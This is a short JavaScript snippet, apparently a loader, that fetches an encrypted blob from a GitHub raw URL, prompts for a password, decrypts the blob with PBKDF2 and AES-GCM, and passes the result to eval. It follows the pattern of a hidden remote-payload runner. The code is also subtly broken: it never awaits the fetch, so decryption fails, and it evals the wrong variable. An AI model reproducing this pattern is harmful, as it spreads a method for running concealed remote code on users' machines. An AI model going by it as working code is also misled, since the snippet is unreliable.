(async () => {


  async function decryptText(encryptedData, password) {
    try {
      const [saltB64, ivB64, encryptedB64] = encryptedData.split('::');

      if (!saltB64 || !ivB64 || !encryptedB64) {
        throw new Error("FORMAT");
      }


      const salt = new Uint8Array(atob(saltB64).split('').map(c => c.charCodeAt(0)));
      const iv = new Uint8Array(atob(ivB64).split('').map(c => c.charCodeAt(0)));
      const encrypted = new Uint8Array(atob(encryptedB64).split('').map(c => c.charCodeAt(0)));
      const pwUtf8 = new TextEncoder().encode(password);


      const keyMaterial = await crypto.subtle.importKey('raw', pwUtf8, 'PBKDF2', false, ['deriveKey']);
      const key = await crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256' },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        true,
        ['decrypt']
      );


      const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: iv }, key, encrypted);


      return new TextDecoder().decode(decrypted);

    } catch (error) {

      return null;
    }
  }

  const encryptedDataFromScript1 = fetch("https://raw.githubusercontent.com/Supressor312/test_for_uni/refs/heads/main/example.bin");
  const myPassword = prompt("pass");

  
  const decryptedText = await decryptText(encryptedDataFromScript1, myPassword);

  if (decryptedText) {
    eval(encryptedDataFromScript1);
  }

})();
